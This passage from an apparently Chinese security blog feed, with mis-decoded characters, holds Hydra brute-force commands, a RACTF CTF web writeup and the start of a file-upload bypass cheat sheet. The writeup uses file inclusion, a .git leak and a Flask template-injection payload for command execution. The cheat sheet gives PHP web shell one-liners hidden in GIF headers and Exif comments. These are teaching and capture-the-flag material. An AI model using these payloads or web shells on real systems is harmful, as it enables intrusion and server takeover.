6chars.txt)ï¼š</span>crunch 6 6 0123456789abcdef -o 6chars.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="å…«ã€å…¶å®ƒå·¥å…·"><a href="#å…«ã€å…¶å®ƒå·¥å…·" class="headerlink" title="å…«ã€å…¶å®ƒå·¥å…·"></a>å…«ã€å…¶å®ƒå·¥å…·</h2><h3 id="1-æš´åŠ›ç ´è§£"><a href="#1-æš´åŠ›ç ´è§£" class="headerlink" title="1. æš´åŠ›ç ´è§£"></a>1. æš´åŠ›ç ´è§£</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>Githubï¼š<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>ç®€ä»‹ï¼šæ”¯æŒå¤šç§åè®®çš„ç”¨æˆ·åå’Œå¯†ç çˆ†ç ´å·¥å…·ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">hydra -l user -P passlist.txt ftp://192.168.0.1hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAINhydra -C defaults.txt -6 pop3s://<span class="token punctuation">[</span>2001:db8::1<span class="token punctuation">]</span>:143/TLS:DIGEST-MD5hydra -l admin -p password ftp://<span class="token punctuation">[</span>192.168.0.0/24<span class="token punctuation">]</span>/hydra -L logins.txt -P pws.txt -M targets.txt <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RACTF Webé¢˜Writeup</title>
      <link href="/post/3f3e39e4.html"/>
      <url>/post/3f3e39e4.html</url>
      
        <content type="html"><![CDATA[<h1 id="RACTF-Web-é¢˜-Writeup"><a href="#RACTF-Web-é¢˜-Writeup" class="headerlink" title="RACTF Web é¢˜ Writeup"></a>RACTF Web é¢˜ Writeup</h1><p>RACTF Web All AK. ğŸ‰ğŸ‰ğŸ‰<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765964308-f0c87678-fea3-41c3-a529-577ba1c039ea.png#clientId=u832c4857-9c1d-4&amp;from=drop&amp;id=u106e408b&amp;margin=%5Bobject%20Object%5D&amp;name=iShot2021-10-09%2015.00.18.png&amp;originHeight=726&amp;originWidth=1449&amp;originalType=binary%E2%88%B6=1&amp;size=98182&amp;status=done&amp;style=none&amp;taskId=u5621f867-46e2-4250-bee2-03e576a904e" alt="iShot2021-10-09 15.00.18.png"></p><h2 id="notrequired"><a href="#notrequired" class="headerlink" title="notrequired"></a>notrequired</h2><h3 id="1-åŸºç¡€åˆ¤æ–­"><a href="#1-åŸºç¡€åˆ¤æ–­" class="headerlink" title="1. åŸºç¡€åˆ¤æ–­"></a>1. åŸºç¡€åˆ¤æ–­</h3><p>æ‰“å¼€ä¼šè‡ªåŠ¨è·³è½¬åˆ°/index.php?file=index.html<br>å°è¯•<strong>ä»»æ„æ–‡ä»¶è¯»å–</strong>ï¼ŒæˆåŠŸè¯»å– /etc/passwd<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635946-22f61fb4-d248-4f75-bf83-aa7b4f69e7fd.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ud621217b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=554&amp;originWidth=1160&amp;originalType=url%E2%88%B6=1&amp;size=122668&amp;status=done&amp;style=none&amp;taskId=uf8143431-893a-454c-bbb9-8a594ecc7c3" alt="image.png"></p><h3 id="2-è¯»å–æ–‡ä»¶"><a href="#2-è¯»å–æ–‡ä»¶" class="headerlink" title="2. è¯»å–æ–‡ä»¶"></a>2. è¯»å–æ–‡ä»¶</h3><p>ä½¿ç”¨ php://filter è¿‡æ»¤å™¨è¯»å– index.php çš„ base64 ç¼–ç å­—ç¬¦ä¸²<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635990-0428ac27-23c6-4e03-84a5-3e0cd583f0c5.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u46871228&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=565&amp;originWidth=1174&amp;originalType=url%E2%88%B6=1&amp;size=128183&amp;status=done&amp;style=none&amp;taskId=u7851d4b9-4d21-4012-8218-9bc4ce9127f" alt="image.png"><br>è§£ç å¾—åˆ°ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span>"location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html");</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#note to myself: delete /bin/secrets.txt!</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®æç¤ºï¼Œè¯»å– <strong>/bin/secrets.txt</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635973-c27f68b3-05a6-47ac-9b33-d290724196a1.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u35e2fe6a&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=454&amp;originWidth=1177&amp;originalType=url%E2%88%B6=1&amp;size=86751&amp;status=done&amp;style=none&amp;taskId=u3ce5ed7a-c881-4d0c-9517-dee57189725" alt="image.png"><br>æŠŠ<strong>BUHC</strong>æ›¿æ¢ä¸º<strong>DO</strong>å³ä¸º Flagã€‚<br>Get Flag!<br>â€‹</p><h2 id="git-commit-m-â€œwhateverâ€"><a href="#git-commit-m-â€œwhateverâ€" class="headerlink" title="git commit -m â€œwhateverâ€"></a>git commit -m â€œwhateverâ€</h2><ol><li>æ‰“å¼€é¡µé¢ï¼Œå¾—åˆ°ä¸€æ®µåŠ å¯†çš„å­—ç¬¦ä¸²å’Œæç¤ºï¼š</li></ol><pre><code>+M/pqMuo4pevO4qE7ETogLZjXSoiLhuqpmWh21pKXOpjftRMSq+ltAaloVOlwR3cGkaBeYxLQEb2kJ7FZg4UBxawjJvpcyKebpVoz6noOnly if you could see the source code.</code></pre><ol start="2"><li>å°è¯•æ‰«æè·¯å¾„ï¼Œå‘ç°å­˜åœ¨**/.git/**è·¯å¾„</li></ol><p>åˆ©ç”¨.git æºä»£ç æ³„éœ²åˆ©ç”¨å·¥å…· <a href="https://github.com/lijiejie/GitHack">GitHack</a> ï¼Œå¾—åˆ°ç½‘ç«™æºä»£ç </p><pre><code>â”œâ”€â”€ Cryptâ”‚   â”œâ”€â”€ AES.phpâ”‚   â”œâ”€â”€ Base.phpâ”‚   â”œâ”€â”€ Blowfish.phpâ”‚   â”œâ”€â”€ DES.phpâ”‚   â”œâ”€â”€ Hash.phpâ”‚   â”œâ”€â”€ RC2.phpâ”‚   â”œâ”€â”€ RC4.phpâ”‚   â”œâ”€â”€ RSA.phpâ”‚   â”œâ”€â”€ Random.phpâ”‚   â”œâ”€â”€ Rijndael.phpâ”‚   â”œâ”€â”€ TripleDES.phpâ”‚   â””â”€â”€ Twofish.phpâ”œâ”€â”€ Fileâ”‚   â”œâ”€â”€ ANSI.phpâ”‚   â”œâ”€â”€ ASN1.phpâ”‚   â””â”€â”€ X509.phpâ”œâ”€â”€ Mathâ”‚   â””â”€â”€ BigInteger.phpâ”œâ”€â”€ Netâ”‚   â”œâ”€â”€ SCP.phpâ”‚   â”œâ”€â”€ SFTPâ”‚   â”‚   â””â”€â”€ Stream.phpâ”‚   â”œâ”€â”€ SFTP.phpâ”‚   â”œâ”€â”€ SSH1.phpâ”‚   â””â”€â”€ SSH2.phpâ”œâ”€â”€ Systemâ”‚   â”œâ”€â”€ SSHâ”‚   â”‚   â””â”€â”€ Agent.phpâ”‚   â””â”€â”€ SSH_Agent.phpâ”œâ”€â”€ bootstrap.phpâ”œâ”€â”€ index.phpâ”œâ”€â”€ openssl.cnfâ””â”€â”€ tempCodeRunnerFile.py</code></pre><ol start="3"><li> å®¡è®¡ä»£ç ï¼Œå‘ç°<strong>index.php</strong>é‡Œæœ‰ä¸ª<strong>crypto</strong>ç±»ï¼Œå­˜åœ¨ä¸¤ä¸ªæ–¹æ³•<code>encryp()</code>å’Œ<code>decrypt()</code>ï¼Œå³åŠ å¯†å’Œè§£å¯†çš„æ–¹æ³•</li></ol><p>â€‹</p><ol start="4"><li> è§£å¯†è¿‡ç¨‹</li></ol><p><img src="https://i.loli.net/2021/10/09/kBeQPfOmI7DnRFW.png#id=ET6Jr&amp;originHeight=242&amp;originWidth=820&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><ol start="5"><li>è°ƒç”¨<code>decrypt()</code>æ–¹æ³•è§£å¯†</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$privatekey</span> <span class="token operator">=</span> <span class="token string">"mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs="</span><span class="token punctuation">;</span><span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token string">"rI6D6aK8m1HhT1oSfsP87trNCrLMMc0MoySGaVbku4H9A3WqS1CgEbhAdZ3VWMAoFuPr9WfG2s5szKfgUFnKnzqv7CieKQvyK/tplDZp "</span><span class="token punctuation">;</span><span class="token variable">$dnc</span> <span class="token operator">=</span> crypto<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">,</span> <span class="token variable">$privatekey</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$dnc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>é‡‡å‘</li></ol><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œè§£å¯†ä»£ç ä¸­è°ƒç”¨äº†<code>sodium_crypto_secretbox_open()</code>è¿™ä¸ªæ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åªæœ‰ (PHP 7 &gt;= 7.2.0, PHP 8) çš„ç‰ˆæœ¬æ‰æœ‰ï¼Œä½¿ç”¨å…¶å®ƒ PHP ç‰ˆæœ¬è¿è¡Œä¼šæŠ¥é”™<br><img src="https://i.loli.net/2021/10/09/wJnQPI1Gl74YfHC.png#id=gT4uM&amp;originHeight=191&amp;originWidth=758&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><ol start="7"><li>è¿è¡Œè§£å¯†ä»£ç ï¼Œget flagï¼</li></ol><p><img src="https://i.loli.net/2021/10/09/6AZHgv4MYo1sDQj.png#id=crrWJ&amp;originHeight=83&amp;originWidth=728&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><h2 id="madlib"><a href="#madlib" class="headerlink" title="madlib"></a>madlib</h2><h3 id="1ã€æ‰“å¼€é¡µé¢ç‚¹å‡»-source-å¾—åˆ°æºä»£ç "><a href="#1ã€æ‰“å¼€é¡µé¢ç‚¹å‡»-source-å¾—åˆ°æºä»£ç " class="headerlink" title="1ã€æ‰“å¼€é¡µé¢ç‚¹å‡» source å¾—åˆ°æºä»£ç "></a>1ã€æ‰“å¼€é¡µé¢ç‚¹å‡» source å¾—åˆ°æºä»£ç </h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708114-308ba8d8-b6cf-4e67-8ad0-4113c0aad69a.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u9355d375&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=334&amp;originWidth=642&amp;originalType=url%E2%88%B6=1&amp;size=36486&amp;status=done&amp;style=none&amp;taskId=ud5e33be0-6ddf-4036-bec6-35ddf705d8c" alt="image.png"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_from_directoryapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/madlib'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">madlib</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>request<span class="token punctuation">.</span>json<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        verb <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'verb'</span><span class="token punctuation">)</span>        noun <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'noun'</span><span class="token punctuation">)</span>        adjective <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'adjective'</span><span class="token punctuation">)</span>        person <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>        place <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'place'</span><span class="token punctuation">)</span>        params <span class="token operator">=</span> <span class="token punctuation">[</span>verb<span class="token punctuation">,</span> noun<span class="token punctuation">,</span> adjective<span class="token punctuation">,</span> person<span class="token punctuation">,</span> place<span class="token punctuation">]</span>        <span class="token keyword">if</span> any<span class="token punctuation">(</span>len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">21</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> params<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'your words must not be longer than 21 characters!'</span><span class="token punctuation">,</span> <span class="token number">403</span>        madlib <span class="token operator">=</span> f<span class="token string">'To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\'t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.'</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>madlib<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This madlib only takes five words'</span><span class="token punctuation">,</span> <span class="token number">403</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'/app/'</span><span class="token punctuation">,</span> <span class="token string">'app.py'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2ã€å¡«å†™ä¿¡æ¯ï¼Œæäº¤"><a href="#2ã€å¡«å†™ä¿¡æ¯ï¼Œæäº¤" class="headerlink" title="2ã€å¡«å†™ä¿¡æ¯ï¼Œæäº¤"></a>2ã€å¡«å†™ä¿¡æ¯ï¼Œæäº¤</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708136-d1f00515-db24-4c51-bf63-e12b9c409c26.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u9b4853be&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=252&amp;originWidth=560&amp;originalType=url%E2%88%B6=1&amp;size=28104&amp;status=done&amp;style=none&amp;taskId=u5d07375c-e7fb-4fce-811e-0a35362eaf9" alt="image.png"></p><h3 id="3-æŠ“åŒ…"><a href="#3-æŠ“åŒ…" class="headerlink" title="3. æŠ“åŒ…"></a>3. æŠ“åŒ…</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765706876-e83eef90-9429-41be-8e5b-937364e18fa7.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u49ee5209&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=1161&amp;originalType=url%E2%88%B6=1&amp;size=106816&amp;status=done&amp;style=none&amp;taskId=u53fec3a9-6e7a-4e1f-9d22-e2cf19220b1" alt="image.png"></p><h3 id="4-åˆ†ææºä»£ç "><a href="#4-åˆ†ææºä»£ç " class="headerlink" title="4. åˆ†ææºä»£ç "></a>4. åˆ†ææºä»£ç </h3><p>æ ¹æ®æºä»£ç å¯ä»¥åˆ¤æ–­å‡ºè¿™æ˜¯ä¸€é“ SSTI é¢˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>post æäº¤ json æ•°æ®åˆ° <em>/madlib</em></li><li>json é•¿åº¦ç­‰äº 5</li><li>json æ•°æ®ä¸­çš„ verbã€nounã€adjectiveã€personã€placeã€params é•¿åº¦ä¸èƒ½è¶…è¿‡ 21</li></ul><p>â€‹</p><h3 id="5-æµ‹è¯•-SSTI"><a href="#5-æµ‹è¯•-SSTI" class="headerlink" title="5. æµ‹è¯• SSTI"></a>5. æµ‹è¯• SSTI</h3><p>åœ¨ verb å¤„è¾“å…¥ 24 è¾“å‡º <strong>24</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765707358-c77c3510-e9a4-46f3-bc2e-825cae9deadb.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ud67ae79d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=426&amp;originWidth=1149&amp;originalType=url%E2%88%B6=1&amp;size=98334&amp;status=done&amp;style=none&amp;taskId=u01cca9d4-8ed4-46e9-9313-281c7ae558a" alt="image.png"></p><h3 id="6-ç»•è¿‡é•¿åº¦åˆ¤æ–­-RCE"><a href="#6-ç»•è¿‡é•¿åº¦åˆ¤æ–­-RCE" class="headerlink" title="6. ç»•è¿‡é•¿åº¦åˆ¤æ–­ RCE"></a>6. ç»•è¿‡é•¿åº¦åˆ¤æ–­ RCE</h3><p>è¿™ä¸€æ­¥å¡äº†æŒºä¹…çš„ï¼Œåæ¥æƒ³åˆ°äº†ï¼šæ—¢ç„¶æ˜¯ json æ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥åµŒå¥— array å‘¢ï¼Ÿå°è¯•äº†ä¸€ä¸‹å‘ç°æœç„¶å¯ä»¥<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765706424-e435911d-b827-48db-bfc0-58ef5d0f2a98.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ub311da77&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=549&amp;originWidth=1169&amp;originalType=url%E2%88%B6=1&amp;size=116874&amp;status=done&amp;style=none&amp;taskId=u803161cd-518d-494b-a907-b3c77412790" alt="image.png"><br>æˆåŠŸç»•è¿‡é•¿åº¦é™åˆ¶ï¼<br>â€‹</p><h3 id="7-RCE"><a href="#7-RCE" class="headerlink" title="7. RCE"></a>7. RCE</h3><p>å¯ä»¥æŠŠå­—ç¬¦ä¸²å†…å®¹å†™åˆ° get å‚æ•°ä¸­ï¼Œä½¿ç”¨ request.args.å‚æ•°åç§°è¯»å–ï¼š</p><pre class="line-numbers language-http"><code class="language-http">POST /madlib?e=__import__('os').popen('ls').read(){"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708458-702f201f-7809-4385-b7de-e9709e72aa18.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u48a787ab&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=534&amp;originWidth=1216&amp;originalType=url%E2%88%B6=1&amp;size=127351&amp;status=done&amp;style=none&amp;taskId=u167b6053-e07a-4532-b1f9-879bf2b212b" alt="image.png"></p><h3 id="8-Get-Flag"><a href="#8-Get-Flag" class="headerlink" title="8. Get Flag"></a>8. Get Flag</h3><pre class="line-numbers language-http"><code class="language-http">POST /madlib?e=__import__('os').popen('cat+flag.txt').read(){"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708965-e73bebe1-95ee-4943-b728-d101f9290fcf.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u6b35c03c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=529&amp;originWidth=1223&amp;originalType=url%E2%88%B6=1&amp;size=128136&amp;status=done&amp;style=none&amp;taskId=u9dec12ed-b0ea-4ace-b290-bd7d23e00e3" alt="image.png"><br>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</title>
      <link href="/post/31538d4f.html"/>
      <url>/post/31538d4f.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h1><h2 id="0x01-ç»•è¿‡é»‘åå•"><a href="#0x01-ç»•è¿‡é»‘åå•" class="headerlink" title="0x01 ç»•è¿‡é»‘åå•"></a>0x01 ç»•è¿‡é»‘åå•</h2><p>é™¤äº†å¸¸è§„æ‰©å±•åä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–æ‰©å±•åå¯ç”¨äºç»•è¿‡é»‘åå•è¿‡æ»¤</p><h3 id="1-PHP"><a href="#1-PHP" class="headerlink" title="1. PHP"></a>1. PHP</h3><pre><code>å¸¸ç”¨æ‰©å±•åï¼š.pht, .phtml, .php3, .php4, .php5, .php6, .incå¤§å°å†™æ•æ„Ÿï¼š.pHp, .Php, .phP</code></pre><h3 id="2-JSP"><a href="#2-JSP" class="headerlink" title="2. JSP"></a>2. JSP</h3><pre><code>.jspx, .jspf, .jsw, .jsv</code></pre><h2 id="0x02-ç»•è¿‡ç™½åå•"><a href="#0x02-ç»•è¿‡ç™½åå•" class="headerlink" title="0x02 ç»•è¿‡ç™½åå•"></a>0x02 ç»•è¿‡ç™½åå•</h2><h3 id="1-jpg"><a href="#1-jpg" class="headerlink" title="1. .jpg"></a>1. .jpg</h3><pre><code>shell.php.jpg</code></pre><h3 id="2-æˆªæ–­"><a href="#2-æˆªæ–­" class="headerlink" title="2. æˆªæ–­"></a>2. æˆªæ–­</h3><pre><code>shell.php%00.jpgæˆ–shell.php\x00.jpg</code></pre><h3 id="3-æ–‡ä»¶å¤´ç±»å‹æ£€æµ‹"><a href="#3-æ–‡ä»¶å¤´ç±»å‹æ£€æµ‹" class="headerlink" title="3. æ–‡ä»¶å¤´ç±»å‹æ£€æµ‹"></a>3. æ–‡ä»¶å¤´ç±»å‹æ£€æµ‹</h3><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token punctuation">;</span> <span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x03-Exif-æ•°æ®"><a href="#0x03-Exif-æ•°æ®" class="headerlink" title="0x03 Exif æ•°æ®"></a>0x03 Exif æ•°æ®</h2><p>ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„ä¸‹ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨å›¾ç‰‡ä¸­çš„ Exif æ•°æ®ï¼Œå¯ä»¥æ’å…¥åŒ…å«æœ‰æ•ˆ PHP ä»£ç çš„æ³¨é‡Šï¼Œè¯¥æ³¨é‡Šå°†åœ¨å¤„ç†å›¾åƒæ—¶ç”±æœåŠ¡å™¨æ‰§è¡Œã€‚<br>æ³¨ï¼šè¯¥æŠ€æœ¯å¯ä»¥ä¸ç»•è¿‡é»‘åå•æˆ–ç™½åå•çš„æ–¹æ³•ç»“åˆä½¿ç”¨</p><h3 id="1-å¯ä»¥ä½¿ç”¨-exiftool-æ¥æ‰§è¡Œæ­¤æ“ä½œ-å¦‚æœå°šæœªå®‰è£…ï¼Œè¯·ä½¿ç”¨-apt-è¿›è¡Œå®‰è£…ï¼š"><a href="#1-å¯ä»¥ä½¿ç”¨-exiftool-æ¥æ‰§è¡Œæ­¤æ“ä½œ-å¦‚æœå°šæœªå®‰è£…ï¼Œè¯·ä½¿ç”¨-apt-è¿›è¡Œå®‰è£…ï¼š" class="headerlink" title="1. å¯ä»¥ä½¿ç”¨ exiftool æ¥æ‰§è¡Œæ­¤æ“ä½œ-å¦‚æœå°šæœªå®‰è£…ï¼Œè¯·ä½¿ç”¨ apt è¿›è¡Œå®‰è£…ï¼š"></a>1. å¯ä»¥ä½¿ç”¨ exiftool æ¥æ‰§è¡Œæ­¤æ“ä½œ-å¦‚æœå°šæœªå®‰è£…ï¼Œè¯·ä½¿ç”¨ apt è¿›è¡Œå®‰è£…ï¼š</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># apt install exiftool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€ä¸ªç®€å•çš„-Shell-å‘½ä»¤ä½œä¸ºæ³¨é‡Šï¼š"><a href="#2-ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€ä¸ªç®€å•çš„-Shell-å‘½ä»¤ä½œä¸ºæ³¨é‡Šï¼š" class="headerlink" title="2. ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€ä¸ªç®€å•çš„ Shell å‘½ä»¤ä½œä¸ºæ³¨é‡Šï¼š"></a>2. ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€ä¸ªç®€å•çš„ Shell å‘½ä»¤ä½œä¸ºæ³¨é‡Šï¼š</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># exiftool -Comment="&lt;?php system($_GET['cmd']); ?>" pic.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-ä½¿ç”¨fileå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç å·²æˆåŠŸæ’å…¥"><a href="#3-ä½¿ç”¨fileå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç å·²æˆåŠŸæ’å…¥" class="headerlink" title="3. ä½¿ç”¨fileå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç å·²æˆåŠŸæ’å…¥"></a>3. ä½¿ç”¨<strong>file</strong>å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç 